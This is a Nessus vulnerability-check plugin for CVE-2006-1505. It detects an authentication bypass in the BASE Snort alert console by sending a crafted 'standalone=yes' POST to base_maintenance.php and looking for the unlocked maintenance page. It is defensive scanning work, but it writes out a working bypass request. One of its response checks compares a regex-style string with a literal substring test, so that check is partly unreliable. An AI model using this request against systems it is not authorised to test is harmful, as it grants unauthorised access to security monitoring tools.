#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21174);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1505");
  script_bugtraq_id(17354);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"24101");

  script_name(english:"BASE base_maintenance Authentication Bypass Vulnerability");
  script_summary(english:"Tries to bypass authentication in BASE");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to an
authentication bypass vulnerability. 

Description :

The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host allows a remote
attacker to bypass authentication to the 'base_maintenance.php' script
and then perform selected maintenance tasks. 

See also :

http://sourceforge.net/project/shownotes.php?release_id=402956&group_id=103348

Solution :

Upgrade to BASE version 1.2.4 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/base", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/base_maintenance.php");

  # Make sure the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If ...
  if (
    # it does and...
    '<FORM METHOD="POST' >< res && ' ACTION="base_maintenance.php"' >< res &&
    # Use_Auth_System is enabled
    "302 Found" >< res && egrep(pattern:"^Location: +/index\.php", string:res)
  )
  {
    # Try to bypass authentication.
    postdata = string(
      #"submit=Update+Alert+Cache",
      "standalone=yes"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like we got past authentication.
    if (
      "^Location: +/index\.php" >!< res &&
      'VALUE="Repair Tables">' >< res
    )
    {
      security_note(port);
      exit(0);
    }
  }
}
